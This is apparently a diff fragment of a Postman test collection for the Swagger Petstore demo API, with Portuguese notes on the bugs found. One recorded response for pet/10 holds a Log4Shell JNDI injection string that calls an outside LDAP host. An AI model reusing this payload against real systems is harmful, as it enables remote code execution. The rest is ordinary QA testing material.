+							"body": "{\n    \"code\": 400,\n    \"message\": \"Input error: query parameter `status value `none` is not in the allowable values `[available, pending, sold]`\"\n}"
+						}
+					]
+				},
+				{
+					"name": "pet/findByTags",
+					"protocolProfileBehavior": {
+						"disableBodyPruning": true
+					},
+					"request": {
+						"method": "GET",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{url}}/api/v3/pet/findByTags?tags=tag1",
+							"host": [
+								"{{url}}"
+							],
+							"path": [
+								"api",
+								"v3",
+								"pet",
+								"findByTags"
+							],
+							"query": [
+								{
+									"key": "tags",
+									"value": "tag1"
+								}
+							]
+						}
+					},
+					"response": [
+						{
+							"name": "status 200 OK",
+							"originalRequest": {
+								"method": "GET",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{url}}/api/v3/pet/findByTags?tags=tag1",
+									"host": [
+										"{{url}}"
+									],
+									"path": [
+										"api",
+										"v3",
+										"pet",
+										"findByTags"
+									],
+									"query": [
+										{
+											"key": "tags",
+											"value": "tag1"
+										}
+									]
+								}
+							},
+							"status": "OK",
+							"code": 200,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Date",
+									"value": "Fri, 02 May 2025 19:55:17 GMT"
+								},
+								{
+									"key": "Content-Type",
+									"value": "application/json"
+								},
+								{
+									"key": "Content-Length",
+									"value": "334"
+								},
+								{
+									"key": "Connection",
+									"value": "keep-alive"
+								},
+								{
+									"key": "Access-Control-Allow-Origin",
+									"value": "*"
+								},
+								{
+									"key": "Access-Control-Allow-Methods",
+									"value": "GET, POST, DELETE, PUT"
+								},
+								{
+									"key": "Access-Control-Allow-Headers",
+									"value": "Content-Type, api_key, Authorization"
+								},
+								{
+									"key": "Access-Control-Expose-Headers",
+									"value": "Content-Disposition"
+								},
+								{
+									"key": "Server",
+									"value": "Jetty(9.4.53.v20231009)"
+								}
+							],
+							"cookie": [],
+							"body": "[\n    {\n        \"id\": 4,\n        \"category\": {\n            \"id\": 1,\n            \"name\": \"Dogs\"\n        },\n        \"name\": \"Dog 1\",\n        \"photoUrls\": [\n            \"url1\",\n            \"url2\"\n        ],\n        \"tags\": [\n            {\n                \"id\": 1,\n                \"name\": \"tag1\"\n            },\n            {\n                \"id\": 2,\n                \"name\": \"tag2\"\n            }\n        ],\n        \"status\": \"available\"\n    },\n    {\n        \"id\": 12345,\n        \"category\": {\n            \"id\": 1,\n            \"name\": \"dogs\"\n        },\n        \"name\": \"\",\n        \"photoUrls\": [\n            \"https://fluffydog.img\"\n        ],\n        \"tags\": [\n            {\n                \"id\": 0,\n                \"name\": \"tag1\"\n            },\n            {\n                \"id\": 1,\n                \"name\": \"tag2\"\n            }\n        ],\n        \"status\": \"available\"\n    }\n]"
+						},
+						{
+							"name": "status 200 OK - No Body (BUG)",
+							"originalRequest": {
+								"method": "GET",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{url}}/api/v3/pet/findByTags?tags=tag50",
+									"host": [
+										"{{url}}"
+									],
+									"path": [
+										"api",
+										"v3",
+										"pet",
+										"findByTags"
+									],
+									"query": [
+										{
+											"key": "tags",
+											"value": "tag50"
+										}
+									]
+								}
+							},
+							"status": "OK",
+							"code": 200,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Date",
+									"value": "Fri, 02 May 2025 19:29:53 GMT"
+								},
+								{
+									"key": "Content-Type",
+									"value": "application/json"
+								},
+								{
+									"key": "Content-Length",
+									"value": "2"
+								},
+								{
+									"key": "Connection",
+									"value": "keep-alive"
+								},
+								{
+									"key": "Access-Control-Allow-Origin",
+									"value": "*"
+								},
+								{
+									"key": "Access-Control-Allow-Methods",
+									"value": "GET, POST, DELETE, PUT"
+								},
+								{
+									"key": "Access-Control-Allow-Headers",
+									"value": "Content-Type, api_key, Authorization"
+								},
+								{
+									"key": "Access-Control-Expose-Headers",
+									"value": "Content-Disposition"
+								},
+								{
+									"key": "Server",
+									"value": "Jetty(9.4.53.v20231009)"
+								}
+							],
+							"cookie": [],
+							"body": "[]"
+						},
+						{
+							"name": "status 400 Bad Request - Params invalid",
+							"originalRequest": {
+								"method": "GET",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{url}}/api/v3/pet/findByTags?tags=name",
+									"host": [
+										"{{url}}"
+									],
+									"path": [
+										"api",
+										"v3",
+										"pet",
+										"findByTags"
+									],
+									"query": [
+										{
+											"key": "tags",
+											"value": "name"
+										}
+									]
+								}
+							},
+							"status": "Bad Request",
+							"code": 400,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Date",
+									"value": "Fri, 02 May 2025 19:19:16 GMT"
+								},
+								{
+									"key": "Content-Type",
+									"value": "application/json",
+									"description": "",
+									"type": "text"
+								},
+								{
+									"key": "Content-Length",
+									"value": "28"
+								},
+								{
+									"key": "Connection",
+									"value": "keep-alive"
+								},
+								{
+									"key": "Access-Control-Allow-Origin",
+									"value": "*"
+								},
+								{
+									"key": "Access-Control-Allow-Methods",
+									"value": "GET, POST, DELETE, PUT"
+								},
+								{
+									"key": "Access-Control-Allow-Headers",
+									"value": "Content-Type, api_key, Authorization"
+								},
+								{
+									"key": "Access-Control-Expose-Headers",
+									"value": "Content-Disposition"
+								},
+								{
+									"key": "Server",
+									"value": "Jetty(9.4.53.v20231009)"
+								}
+							],
+							"cookie": [],
+							"body": "No tags provided. Try again?"
+						}
+					]
+				},
+				{
+					"name": "pet/{petId}",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{url}}/api/v3/pet/10",
+							"host": [
+								"{{url}}"
+							],
+							"path": [
+								"api",
+								"v3",
+								"pet",
+								"10"
+							]
+						}
+					},
+					"response": [
+						{
+							"name": "status 200 OK",
+							"originalRequest": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{url}}/api/v3/pet/10",
+									"host": [
+										"{{url}}"
+									],
+									"path": [
+										"api",
+										"v3",
+										"pet",
+										"10"
+									]
+								}
+							},
+							"status": "OK",
+							"code": 200,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Date",
+									"value": "Fri, 02 May 2025 19:46:45 GMT"
+								},
+								{
+									"key": "Content-Type",
+									"value": "application/json"
+								},
+								{
+									"key": "Content-Length",
+									"value": "192"
+								},
+								{
+									"key": "Connection",
+									"value": "keep-alive"
+								},
+								{
+									"key": "Access-Control-Allow-Origin",
+									"value": "*"
+								},
+								{
+									"key": "Access-Control-Allow-Methods",
+									"value": "GET, POST, DELETE, PUT"
+								},
+								{
+									"key": "Access-Control-Allow-Headers",
+									"value": "Content-Type, api_key, Authorization"
+								},
+								{
+									"key": "Access-Control-Expose-Headers",
+									"value": "Content-Disposition"
+								},
+								{
+									"key": "Server",
+									"value": "Jetty(9.4.53.v20231009)"
+								}
+							],
+							"cookie": [],
+							"body": "{\n    \"id\": 10,\n    \"category\": {\n        \"id\": 1,\n        \"name\": \"${jndi:ldap://d27vbhkq2pofwofpmogi67yi34.odiss.eu/abc}\"\n    },\n    \"name\": \"doggie\",\n    \"photoUrls\": [\n        \"John Doe\"\n    ],\n    \"tags\": [\n        {\n            \"id\": 10,\n            \"name\": \"John Doe\"\n        }\n    ],\n    \"status\": \"available\"\n}"
+						},
+						{
+							"name": "status 404 Not Fround",
+							"originalRequest": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{url}}/api/v3/pet/50",
+									"host": [
+										"{{url}}"
+									],
+									"path": [
+										"api",
+										"v3",
+										"pet",
+										"50"
+									]
+								}
+							},
+							"status": "Not Found",
+							"code": 404,
+							"_postman_previewlanguage": "html",
+							"header": [
+								{
+									"key": "Date",
+									"value": "Mon, 05 May 2025 13:13:16 GMT"
+								},
+								{
+									"key": "Content-Type",
+									"value": "text/html"
+								},
+								{
+									"key": "Transfer-Encoding",
+									"value": "chunked"
+								},
+								{
+									"key": "Connection",
+									"value": "keep-alive"
+								},
+								{
+									"key": "Server",
+									"value": "nginx"
+								},
+								{
+									"key": "Vary",
+									"value": "Accept-Encoding"
+								},
+								{
+									"key": "Access-Control-Allow-Origin",
+									"value": "*"
+								},
+								{
+									"key": "Access-Control-Allow-Methods",
+									"value": "GET, POST, OPTIONS"
+								},
+								{
+									"key": "Access-Control-Allow-Headers",
+									"value": "DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type"
+								},
+								{
+									"key": "X-Frame-Options",
+									"value": "DENY"
+								},
+								{
+									"key": "Content-Security-Policy",
+									"value": "frame-ancestors 'none'"
+								},
+								{
+									"key": "Content-Encoding",
+									"value": "gzip"
+								}
+							],
+							"cookie": [],
+							"body": "<html>\n    <head>\n        <title>404 Not Found</title>\n    </head>\n    <body>\n        <center>\n            <h1>404 Not Found</h1>\n        </center>\n        <hr>\n        <center>nginx</center>\n    </body>\n</html>"
+						}
+					]
+				}
+			],
+			"description": "Everything about your Pets"
+		},
+		{
+			"name": "Store",
+			"item": [
+				{
+					"name": "Place a new order in the store.",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n  \"id\": 10,\r\n  \"petId\": 198772,\r\n  \"quantity\": 7,\r\n  \"shipDate\": \"2025-04-30T13:02:32.130Z\",\r\n  \"status\": \"approved\",\r\n  \"complete\": true\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://petstore3.swagger.io/api/v3/store/order",
+							"protocol": "https",
+							"host": [
+								"petstore3",
+								"swagger",
+								"io"
+							],
+							"path": [
+								"api",
+								"v3",
+								"store",
+								"order"
+							],
+							"query": [
+								{
+									"key": "",
+									"value": "",
+									"disabled": true
+								}
+							]
+						}
+					},
+					"response": [
+						{
+							"name": "Permite valores do tipo Numberm em campos Boolean.",
+							"originalRequest": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\r\n  \"id\": 10,\r\n  \"petId\": 198772,\r\n  \"quantity\": 7,\r\n  \"shipDate\": \"2025-04-30T13:02:32.130Z\",\r\n  \"status\": \"approved\",\r\n  \"complete\": 10000\r\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "https://petstore3.swagger.io/api/v3/store/order",
+									"protocol": "https",
+									"host": [
+										"petstore3",
+										"swagger",
+										"io"
+									],
+									"path": [
+										"api",
+										"v3",
+										"store",
+										"order"
+									],
+									"query": [
+										{
+											"key": "",
+											"value": "",
+											"disabled": true
+										}
+									]
+								}
+							},
+							"status": "OK",
+							"code": 200,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Date",
+									"value": "Fri, 02 May 2025 20:08:12 GMT"
+								},
+								{
+									"key": "Content-Type",
+									"value": "application/json"
+								},
+								{
+									"key": "Content-Length",
+									"value": "116"
+								},
+								{
+									"key": "Connection",
+									"value": "keep-alive"
+								},
+								{
+									"key": "Access-Control-Allow-Origin",
+									"value": "*"
+								},
+								{
+									"key": "Access-Control-Allow-Methods",
+									"value": "GET, POST, DELETE, PUT"
+								},
+								{
+									"key": "Access-Control-Allow-Headers",
+									"value": "Content-Type, api_key, Authorization"
+								},
+								{
+									"key": "Access-Control-Expose-Headers",
+									"value": "Content-Disposition"
+								},
+								{
+									"key": "Server",
+									"value": "Jetty(9.4.53.v20231009)"
+								}
+							],
+							"cookie": [],
+							"body": "{\n    \"id\": 10,\n    \"petId\": 198772,\n    \"quantity\": 7,\n    \"shipDate\": \"2025-04-30T13:02:32.130+00:00\",\n    \"status\": \"approved\",\n    \"complete\": true\n}"
+						},
+						{
+							"name": "O campo ID permite valores negativos.",
+							"originalRequest": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\r\n  \"id\": -10,\r\n  \"petId\": 198772,\r\n  \"quantity\": 7,\r\n  \"shipDate\": \"2025-04-30T13:02:32.130Z\",\r\n  \"status\": \"approved\",\r\n  \"complete\": true\r\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "https://petstore3.swagger.io/api/v3/store/order",
+									"protocol": "https",
+									"host": [
+										"petstore3",
+										"swagger",
+										"io"
+									],
+									"path": [
+										"api",
+										"v3",
+										"store",
+										"order"
+									],
+									"query": [
+										{
+											"key": "",
+											"value": "",
+											"disabled": true
+										}
+									]
+								}
+							},
+							"status": "OK",
+							"code": 200,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Date",
+									"value": "Fri, 02 May 2025 20:11:50 GMT"
+								},
+								{
+									"key": "Content-Type",
+									"value": "application/json"
+								},
+								{
+									"key": "Content-Length",
+									"value": "117"
+								},
+								{
+									"key": "Connection",
+									"value": "keep-alive"
+								},
+								{
+									"key": "Access-Control-Allow-Origin",
+									"value": "*"
+								},
+								{
+									"key": "Access-Control-Allow-Methods",
+									"value": "GET, POST, DELETE, PUT"
+								},
+								{
+									"key": "Access-Control-Allow-Headers",
+									"value": "Content-Type, api_key, Authorization"
+								},
+								{
+									"key": "Access-Control-Expose-Headers",
+									"value": "Content-Disposition"
+								},
+								{
+									"key": "Server",
+									"value": "Jetty(9.4.53.v20231009)"
+								}
+							],
+							"cookie": [],
+							"body": "{\n    \"id\": -10,\n    \"petId\": 198772,\n    \"quantity\": 7,\n    \"shipDate\": \"2025-04-30T13:02:32.130+00:00\",\n    \"status\": \"approved\",\n    \"complete\": true\n}"
+						},
+						{
+							"name": "Permite campos em branco.",
+							"originalRequest": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\r\n  \"id\": null,\r\n  \"petId\": null,\r\n  \"quantity\": null,\r\n  \"shipDate\": null,\r\n  \"status\": null,\r\n  \"complete\": null\r\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "https://petstore3.swagger.io/api/v3/store/order",
+									"protocol": "https",
+									"host": [
+										"petstore3",
+										"swagger",
+										"io"
+									],
+									"path": [
+										"api",
+										"v3",
+										"store",
+										"order"
+									],
+									"query": [
+										{
+											"key": "",
+											"value": "",
+											"disabled": true
+										}
+									]
+								}
+							},
+							"status": "OK",
+							"code": 200,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Date",
+									"value": "Fri, 02 May 2025 20:14:12 GMT"
+								},
+								{
+									"key": "Content-Type",
+									"value": "application/json"
+								},
+								{
+									"key": "Content-Length",
+									"value": "48"
+								},
+								{
+									"key": "Connection",
+									"value": "keep-alive"
+								},
+								{
+									"key": "Access-Control-Allow-Origin",
+									"value": "*"
+								},
+								{
+									"key": "Access-Control-Allow-Methods",
+									"value": "GET, POST, DELETE, PUT"
+								},
+								{
+									"key": "Access-Control-Allow-Headers",
+									"value": "Content-Type, api_key, Authorization"
+								},
+								{
+									"key": "Access-Control-Expose-Headers",
+									"value": "Content-Disposition"
+								},
+								{
+									"key": "Server",
+									"value": "Jetty(9.4.53.v20231009)"
+								}
+							],
+							"cookie": [],
+							"body": "{\n    \"id\": 0,\n    \"petId\": 0,\n    \"quantity\": 0,\n    \"complete\": false\n}"
+						}
+					]
+				},
+				{
+					"name": "Return pet inventories by status",
+					"request": {
+						"auth": {
+							"type": "noauth"
+						},
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "https://petstore3.swagger.io/api/v3/store/inventory",
+							"protocol": "https",
+							"host": [
+								"petstore3",
+								"swagger",
+								"io"
+							],
+							"path": [
+								"api",
+								"v3",
+								"store",
+								"inventory"
+							]
+						}
+					},
+					"response": [
+						{
+							"name": "Status 200",
+							"originalRequest": {
+								"method": "GET",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "https://petstore3.swagger.io/api/v3/store/inventory",
+									"protocol": "https",
+									"host": [
+										"petstore3",
+										"swagger",
+										"io"
+									],
+									"path": [
+										"api",
+										"v3",
+										"store",
+										"inventory"
+									]
+								}
+							},
+							"status": "OK",
+							"code": 200,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Date",
+									"value": "Fri, 02 May 2025 18:50:49 GMT"
+								},
+								{
+									"key": "Content-Type",
+									"value": "application/json"
+								},
+								{
+									"key": "Content-Length",
+									"value": "86"
+								},
+								{
+									"key": "Connection",
+									"value": "keep-alive"
+								},
+								{
+									"key": "Access-Control-Allow-Origin",
+									"value": "*"
+								},
+								{
+									"key": "Access-Control-Allow-Methods",
+									"value": "GET, POST, DELETE, PUT"
+								},
+								{
+									"key": "Access-Control-Allow-Headers",
+									"value": "Content-Type, api_key, Authorization"
+								},
+								{
+									"key": "Access-Control-Expose-Headers",
+									"value": "Content-Disposition"
+								},
+								{
+									"key": "Server",
+									"value": "Jetty(9.4.53.v20231009)"
+								}
+							],
+							"cookie": [],
+							"body": "{\n    \"\": 10,\n    \"ordered\": 1835322916,\n    \"approved\": -709871501,\n    \"placed\": -414195170,\n    \"delivered\": 321\n}"
+						}
+					]
+				},
+				{
+					"name": "Find a purchase by id",
+					"request": {
+						"auth": {
+							"type": "noauth"
+						},
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "https://petstore3.swagger.io/api/v3/store/order/10",
+							"protocol": "https",
+							"host": [
+								"petstore3",
+								"swagger",
+								"io"
+							],
+							"path": [
+								"api",
+								"v3",
+								"store",
+								"order",
+								"10"
+							]
+						}
+					},
+					"response": [
+						{
+							"name": "Status 200",
+							"originalRequest": {
+								"method": "GET",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "https://petstore3.swagger.io/api/v3/store/order/10",
+									"protocol": "https",
+									"host": [
+										"petstore3",
+										"swagger",
+										"io"
+									],
+									"path": [
+										"api",
+										"v3",
+										"store",
+										"order",
+										"10"
+									]
+								}
+							},
+							"status": "OK",
+							"code": 200,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Date",
+									"value": "Fri, 02 May 2025 18:51:27 GMT"
+								},
+								{
+									"key": "Content-Type",
+									"value": "application/json"
+								},
+								{
+									"key": "Content-Length",
+									"value": "114"
+								},
+								{
+									"key": "Connection",
+									"value": "keep-alive"
+								},
+								{
+									"key": "Access-Control-Allow-Origin",
+									"value": "*"
+								},
+								{
+									"key": "Access-Control-Allow-Methods",
+									"value": "GET, POST, DELETE, PUT"
+								},
+								{
+									"key": "Access-Control-Allow-Headers",
+									"value": "Content-Type, api_key, Authorization"
+								},
+								{
+									"key": "Access-Control-Expose-Headers",
+									"value": "Content-Disposition"
+								},
+								{
+									"key": "Server",
+									"value": "Jetty(9.4.53.v20231009)"
+								}
+							],
+							"cookie": [],
+							"body": "{\n    \"id\": 10,\n    \"petId\": 198772,\n    \"quantity\": 7,\n    \"shipDate\": \"1970-01-01T00:00:00.001+00:00\",\n    \"status\": \"placed\",\n    \"complete\": true\n}"
+						}
+					]
+				},
+				{
+					"name": "Delete purchase by order by identifier",
+					"request": {
+						"auth": {
+							"type": "noauth"
+						},
+						"method": "DELETE",
+						"header": [],
+						"url": {
+							"raw": "https://petstore3.swagger.io/api/v3/store/order/-109090",
+							"protocol": "https",
+							"host": [
+								"petstore3",
+								"swagger",
+								"io"
+							],
+							"path": [
+								"api",
+								"v3",
+								"store",
+								"order",
+								"-109090"
+							]
+						}
+					},
+					"response": [
+						{
+							"name": "BUG 001 - Inclusão de número negativo com Status 200",
+							"originalRequest": {
+								"method": "DELETE",
+								"header": [],
+								"url": {
+									"raw": "https://petstore3.swagger.io/api/v3/store/order/-109090",
+									"protocol": "https",
+									"host": [
+										"petstore3",
+										"swagger",
+										"io"
+									],
+									"path": [
+										"api",
+										"v3",
+										"store",
+										"order",
+										"-109090"
+									]
+								}
+							},
+							"status": "OK",
+							"code": 200,
+							"_postman_previewlanguage": "plain",
+							"header": [
+								{
+									"key": "Date",
+									"value": "Fri, 02 May 2025 20:33:25 GMT"
+								},
+								{
+									"key": "Content-Length",
+									"value": "0"
+								},
+								{
+									"key": "Connection",
+									"value": "keep-alive"
+								},
+								{
+									"key": "Access-Control-Allow-Origin",
+									"value": "*"
+								},
+								{
+									"key": "Access-Control-Allow-Methods",
+									"value": "GET, POST, DELETE, PUT"
+								},
+								{
+									"key": "Access-Control-Allow-Headers",
+									"value": "Content-Type, api_key, Authorization"
+								},
+								{
+									"key": "Access-Control-Expose-Headers",
+									"value": "Content-Disposition"
+								},
+								{
+									"key": "Server",
+									"value": "Jetty(9.4.53.v20231009)"
+								}
+							],
+							"cookie": [],
+							"body": null
+						}
+					]
+				}
+			],
+			"description": "Access to Petstore orders"
+		},
+		{
+			"name": "User",
+			"item": [
+				{
+					"name": "Create User",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									""
+								],
+								"type": "text/javascript",
+								"packages": {}
+							}
+						}
+					],
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n  \"id\": 10,\r\n  \"username\": \"theUser\",\r\n  \"firstName\": \"John\",\r\n  \"lastName\": \"James\",\r\n  \"email\": \"john@email.com\",\r\n  \"password\": \"12345\",\r\n  \"phone\": \"12345\",\r\n  \"userStatus\": 1\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://petstore3.swagger.io/api/v3/user",
+							"protocol": "https",
+							"host": [
+								"petstore3",
+								"swagger",
+								"io"
+							],
+							"path": [
+								"api",
+								"v3",
+								"user"
+							]
+						}
+					},
+					"response": [
+						{
+							"name": "OBS - Inconsistência do servidor da API",
+							"originalRequest": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\r\n  \"id\": 11,\r\n  \"username\": \"Tester\",\r\n  \"firstName\": \"QaTest\",\r\n  \"lastName\": \"Teste da Silva\",\r\n  \"email\": \"teste@novo.com\",\r\n  \"password\": \"132546\",\r\n  \"phone\": \"4199999999\",\r\n  \"userStatus\": 1\r\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "https://petstore3.swagger.io/api/v3/user",
+									"protocol": "https",
+									"host": [
+										"petstore3",
+										"swagger",
+										"io"
+									],
+									"path": [
+										"api",
+										"v3",
+										"user"
+									]
+								}
+							},
+							"status": "Internal Server Error",
+							"code": 500,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Date",
+									"value": "Mon, 05 May 2025 14:13:16 GMT"
+								},
+								{
+									"key": "Content-Type",
+									"value": "application/json"
+								},
+								{
+									"key": "Content-Length",
+									"value": "110"
+								},
+								{
+									"key": "Connection",
+									"value": "keep-alive"
+								},
+								{
+									"key": "Access-Control-Allow-Origin",
+									"value": "*"
+								},
+								{
+									"key": "Access-Control-Allow-Methods",
+									"value": "GET, POST, DELETE, PUT"
+								},
+								{
+									"key": "Access-Control-Allow-Headers",
+									"value": "Content-Type, api_key, Authorization"
+								},
+								{
+									"key": "Access-Control-Expose-Headers",
+									"value": "Content-Disposition"
+								},
+								{
+									"key": "Server",
+									"value": "Jetty(9.4.53.v20231009)"
+								}
+							],
+							"cookie": [],
+							"body": "{\n    \"code\": 500,\n    \"message\": \"There was an error processing your request. It has been logged (ID: 51d636059d009c56)\"\n}"
+						}
+					]
+				},
+				{
+					"name": "Creates lists of users with given input array",
+					"request": {
+						"auth": {
+							"type": "noauth"
+						},
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "[\r\n  {\r\n    \"id\": 10,\r\n    \"username\": \"theUser\",\r\n    \"firstName\": \"John\",\r\n    \"lastName\": \"James\",\r\n    \"email\": \"john@email.com\",\r\n    \"password\": \"12345\",\r\n    \"phone\": \"12345\",\r\n    \"userStatus\": 1\r\n  }\r\n]",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://petstore3.swagger.io/api/v3/user/createWithList",
+							"protocol": "https",
+							"host": [
+								"petstore3",
+								"swagger",
+								"io"
+							],
+							"path": [
+								"api",
+								"v3",
+								"user",
+								"createWithList"
+							]
+						}
+					},
+					"response": [
+						{
+							"name": "OBS - Inconsistência do servidor da API",
+							"originalRequest": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "[\r\n  {\r\n    \"id\": 10,\r\n    \"username\": \"theUser\",\r\n    \"firstName\": \"John\",\r\n    \"lastName\": \"James\",\r\n    \"email\": \"john@email.com\",\r\n    \"password\": \"12345\",\r\n    \"phone\": \"12345\",\r\n    \"userStatus\": 1\r\n  }\r\n]",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "https://petstore3.swagger.io/api/v3/user/createWithList",
+									"protocol": "https",
+									"host": [
+										"petstore3",
+										"swagger",
+										"io"
+									],
+									"path": [
+										"api",
+										"v3",
+										"user",
+										"createWithList"
+									]
+								}
+							},
+							"status": "Internal Server Error",
+							"code": 500,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Date",
+									"value": "Fri, 02 May 2025 18:55:34 GMT"
+								},
+								{
+									"key": "Content-Type",
+									"value": "application/json"
+								},
+								{
+									"key": "Content-Length",
+									"value": "110"
+								},
+								{
+									"key": "Connection",
+									"value": "keep-alive"
+								},
+								{
+									"key": "Access-Control-Allow-Origin",
+									"value": "*"
+								},
+								{
+									"key": "Access-Control-Allow-Methods",
+									"value": "GET, POST, DELETE, PUT"
+								},
+								{
+									"key": "Access-Control-Allow-Headers",
+									"value": "Content-Type, api_key, Authorization"
+								},
+								{
+									"key": "Access-Control-Expose-Headers",
+									"value": "Content-Disposition"
+								},
+								{
+									"key": "Server",
+									"value": "Jetty(9.4.53.v20231009)"
+								}
+							],
+							"cookie": [],
+							"body": "{\n    \"code\": 500,\n    \"message\": \"There was an error processing your request. It has been logged (ID: c50039e8bbe07f46)\"\n}"
+						}
+					]
+				},
+				{
+					"name": "Logs user into the system",
+					"request": {
+						"auth": {
+							"type": "noauth"
+						},
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "https://petstore3.swagger.io/api/v3/user/theUser",
+							"protocol": "https",
+							"host": [
+								"petstore3",
+								"swagger",
+								"io"
+							],
+							"path": [
+								"api",
+								"v3",
+								"user",
+								"theUser"
+							]
+						}
+					},
+					"response": [
+						{
+							"name": "Status 200",
+							"originalRequest": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "https://petstore3.swagger.io/api/v3/user/theUser",
+									"protocol": "https",
+									"host": [
+										"petstore3",
+										"swagger",
+										"io"
+									],
+									"path": [
+										"api",
+										"v3",
+										"user",
+										"theUser"
+									]
+								}
+							},
+							"status": "OK",
+							"code": 200,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Date",
+									"value": "Fri, 02 May 2025 19:35:21 GMT"
+								},
+								{
+									"key": "Content-Type",
+									"value": "application/json"
+								},
+								{
+									"key": "Content-Length",
+									"value": "149"
+								},
+								{
+									"key": "Connection",
+									"value": "keep-alive"
+								},
+								{
+									"key": "Access-Control-Allow-Origin",
+									"value": "*"
+								},
+								{
+									"key": "Access-Control-Allow-Methods",
+									"value": "GET, POST, DELETE, PUT"
+								},
+								{
+									"key": "Access-Control-Allow-Headers",
+									"value": "Content-Type, api_key, Authorization"
+								},
+								{
+									"key": "Access-Control-Expose-Headers",
+									"value": "Content-Disposition"
+								},
+								{
+									"key": "Server",
+									"value": "Jetty(9.4.53.v20231009)"
+								}
+							],
+							"cookie": [],
+							"body": "{\n    \"id\": 10,\n    \"username\": \"theUser\",\n    \"firstName\": \"John\",\n    \"lastName\": \"James\",\n    \"email\": \"john@email.com\",\n    \"password\": \"XXXXXXXXXXX\",\n    \"phone\": \"12345\",\n    \"userStatus\": 1\n}"
+						}
+					]
+				},
+				{
+					"name": "Logs out current logged in user  section",
+					"request": {
+						"auth": {
+							"type": "noauth"
+						},
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "https://petstore3.swagger.io/api/v3/user/logout",
+							"protocol": "https",
+							"host": [
+								"petstore3",
+								"swagger",
+								"io"
+							],
+							"path": [
+								"api",
+								"v3",
+								"user",
+								"logout"
+							]
+						}
+					},
+					"response": [
+						{
+							"name": "Status 200 - Usuário desconectado",
+							"originalRequest": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "https://petstore3.swagger.io/api/v3/user/logout",
+									"protocol": "https",
+									"host": [
+										"petstore3",
+										"swagger",
+										"io"
+									],
+									"path": [
+										"api",
+										"v3",
+										"user",
+										"logout"
+									]
+								}
+							},
+							"status": "OK",
+							"code": 200,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Date",
+									"value": "Fri, 02 May 2025 19:35:50 GMT"
+								},
+								{
+									"key": "Content-Type",
+									"value": "application/json"
+								},
+								{
+									"key": "Content-Length",
+									"value": "15"
+								},
+								{
+									"key": "Connection",
+									"value": "keep-alive"
+								},
+								{
+									"key": "Access-Control-Allow-Origin",
+									"value": "*"
+								},
+								{
+									"key": "Access-Control-Allow-Methods",
+									"value": "GET, POST, DELETE, PUT"
+								},
+								{
